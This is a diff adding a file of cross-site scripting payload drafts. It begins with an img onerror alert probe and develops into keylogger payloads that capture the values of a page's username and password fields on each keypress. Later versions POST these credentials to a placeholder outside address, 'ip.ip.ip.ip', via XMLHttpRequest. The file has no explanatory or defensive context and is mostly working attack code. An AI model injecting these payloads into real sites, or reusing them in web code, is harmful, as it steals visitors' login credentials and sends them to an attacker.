@@ -1,0 +1,34 @@
+<img src="hacked.jpg">
+
+<img src="hacked.jpg" onerror="alert(1)">
+
+
+
+<img src="hacked.jpg" onerror="document.onkeypress=(e)=>console.log('uname:' + document.getElementById('username').value + '\npwd: ' + document.getElementById('password').value + e.key)">
+
+<img src="hacked.jpg" onerror="document.onkeypress = (e) => console.log(
+	'uname:' + document.getElementById('username').value + 
+	'\npwd: ' + document.getElementById('password').value + e.key)">
+
+document.onkeypress = (e) => console.log(
+	'uname:' + document.getElementById('username').value + 
+	'\npwd: ' + document.getElementById('password').value + e.key)
+
+
+
+
+
+<img src="hacked.jpg" onerror="document.onkeypress = (e) => {
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST', 'ip.ip.ip.ip', true);
+	xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	xhr.send('uname='+document.getElementById('username').value+'pwd='+document.getElementById('password')+e.key)
+}">
+
+
+document.onkeypress = (e) => {
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST', 'ip.ip.ip.ip', true);
+	xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	xhr.send('uname='+document.getElementById('username').value+'pwd='+document.getElementById('password')+e.key)
+}
